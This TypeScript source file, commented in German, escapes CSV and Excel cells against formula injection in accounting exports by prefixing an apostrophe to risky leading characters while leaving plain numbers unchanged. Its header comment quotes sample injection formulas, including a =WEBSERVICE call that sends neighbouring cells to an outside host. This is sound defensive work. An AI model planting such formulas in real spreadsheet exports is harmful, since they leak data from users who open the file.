/**
 * CSV-Zellen — sicher für Tabellenkalkulationen (2026-09-27).
 *
 * **Das Problem.** Excel, LibreOffice und Google Sheets deuten eine Zelle,
 * die mit `=`, `+`, `-` oder `@` beginnt, als Formel — auch in einer
 * CSV-Datei. Beginnt auch Tabulator oder Wagenrücklauf eine Zelle, lässt sich
 * die Erkennung in manchen Programmen damit umgehen. Eine Ausgabe mit der
 * Beschreibung `=HYPERLINK("https://…","Beleg")` oder
 * `=WEBSERVICE("https://…/?"&A2)` führt beim Öffnen Code aus oder schickt
 * Nachbarzellen nach aussen (CSV/Formula Injection). Die Buchhaltungsexporte
 * enthielten Freitext von aussen — Ausgabenbeschreibung, Lieferantenname,
 * Belegnummer — ungeschützt.
 *
 * **Die Strategie (OWASP).** Beginnt ein Text mit einem dieser Zeichen, wird
 * ein Apostroph vorangestellt. Die Tabellenkalkulation zeigt den Text dann
 * als Text an; der Apostroph selbst ist dort unsichtbar bzw. als
 * Textmarkierung verstanden. **Ausgenommen sind Zahlen** (`-12.50`): Ein
 * negativer Betrag ist keine Formel, und ihn zu verändern hiesse, legitime
 * Daten still zu verfälschen — genau das soll hier nicht geschehen. Die
 * Regel steht also nicht auf „alles mit Minus", sondern auf „alles, was
 * keine reine Zahl ist".
 *
 * Danach wie bisher: Enthält die Zelle Trennzeichen, Anführungszeichen oder
 * Zeilenumbruch, wird sie in Anführungszeichen gesetzt und inneres `"`
 * verdoppelt.
 *
 * Ohne `server-only`: Die Einsatzgebiets-Verwaltung baut ihre CSV im Browser.
 */

const FORMELANFANG = /^[=+\-@\t\r]/;
const REINE_ZAHL = /^[+-]?\d+(?:[.,]\d+)?$/;

/**
 * Einen Text entschärfen, der als Formel gelesen werden könnte — dieselbe
 * Regel für CSV und Excel (2026-09-27).
 *
 * Für Excel-Mappen (`exceljs`): Eine Zeichenkette landet dort als Textzelle
 * und wird beim Öffnen nicht ausgewertet. Aber ein Doppelklick in die Zelle
 * und Enter macht aus `=HYPERLINK(…)` eine lebende Formel, und wer die Mappe
 * als CSV weiterspeichert, hat das CSV-Problem zurück. Die Exporte der
 * Kundschaft, Rechnungen und Zeiten schrieben Freitext bis dahin
 * ungeschützt.
 */
export function formelsicher(text: string): string {
  return FORMELANFANG.test(text) && !REINE_ZAHL.test(text) ? `'${text}` : text;
}

/** Eine Zelle entschärfen und — wo nötig — in Anführungszeichen setzen. */
export function csvZelle(wert: unknown, trenner = ';'): string {
  if (wert === null || wert === undefined) return '';
  const text = formelsicher(String(wert));
  const braucht = text.includes(trenner) || /["\r\n]/.test(text);
  return braucht ? `"${text.replace(/"/g, '""')}"` : text;
}

/** Eine Zeile aus Zellen. */
export function csvZeile(werte: unknown[], trenner = ';'): string {
  return werte.map((w) => csvZelle(w, trenner)).join(trenner);
}
